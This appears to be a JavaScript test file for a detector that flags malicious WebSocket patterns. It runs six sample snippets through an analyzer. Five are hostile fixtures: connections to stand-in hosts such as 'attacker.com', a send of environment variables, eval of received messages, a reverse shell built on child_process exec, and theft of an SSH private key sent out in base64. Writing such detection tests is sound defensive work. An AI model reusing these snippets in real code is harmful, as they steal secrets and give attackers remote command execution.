/**
 * Test cases for WebSocket malicious pattern detection
 */

import { analyzeContent } from './src/analyzer.js';

// Test Case 1: Basic WebSocket import and connection
const test1 = `
const WebSocket = require('ws');
const ws = new WebSocket('ws://malicious-c2.com:8080');
`;

// Test Case 2: WebSocket sending environment data (exfiltration)
const test2 = `
const ws = new WebSocket('wss://attacker.com/exfil');
ws.send(JSON.stringify(process.env));
`;

// Test Case 3: Reverse shell over WebSocket with eval on messages
const test3 = `
ws.on('message', (data) => {
  eval(data.toString());
});
`;

// Test Case 4: WebSocket reverse shell with child process execution
const test4 = `
const { exec } = require('child_process');
const ws = new WebSocket('ws://reverse-shell.example.com/backdoor');

ws.on('message', (command) => {
  exec(command, (error, stdout, stderr) => {
    ws.send(stdout);
  });
});
`;

// Test Case 5: WebSocket sending base64 encoded file data
const test5 = `
const fs = require('fs');
fs.readFile('/home/user/.ssh/id_rsa', (err, data) => {
  ws.send(Buffer.from(data).toString('base64'));
});
`;

// Test Case 6: Legitimate WebSocket use (should still detect but lower confidence)
const test6 = `
// Legitimate real-time chat application
class ChatClient {
  constructor(url) {
    this.ws = new WebSocket(url);
    this.ws.on('message', this.handleMessage.bind(this));
  }
  
  handleMessage(msg) {
    this.emit('message', msg);
  }
  
  send(data) {
    this.ws.send(JSON.stringify(data));
  }
}
`;

function runTests() {
  console.log('Testing WebSocket malicious pattern detection\n');
  
  const tests = [
    { name: 'Test 1: Basic WebSocket connection', content: test1, expectedFindings: 1 },
    { name: 'Test 2: WebSocket exfiltrating env vars', content: test2, expectedFindings: 4 },
    { name: 'Test 3: Reverse shell with eval', content: test3, expectedFindings: 2 },
    { name: 'Test 4: Reverse shell with child_process', content: test4, expectedFindings: 3 },
    { name: 'Test 5: Exfiltrating files via WebSocket', content: test5, expectedFindings: 3 },
    { name: 'Test 6: Legitimate chat app', content: test6, expectedFindings: 1 },
  ];
  
  let passed = 0;
  let failed = 0;
  
  for (const test of tests) {
    const result = analyzeContent(test.content);
    console.log(`\n${test.name}:`);
    console.log(`  Expected findings: ${test.expectedFindings}, Got: ${result.summary.total}`);
    result.findings.forEach(f => {
      console.log(`    - [${f.severity}] ${f.patternId}: ${f.name}`);
    });
    
    // We just check that we found at least N findings (allow additional matches)
    if (result.summary.total >= test.expectedFindings) {
      console.log(`  ✅ PASSED`);
      passed++;
    } else {
      console.log(`  ❌ FAILED`);
      failed++;
    }
  }
  
  console.log(`\n${'='.repeat(50)}`);
  console.log(`Results: ${passed} passed, ${failed} failed`);
  console.log(`${'='.repeat(50)}\n`);
}

runTests();
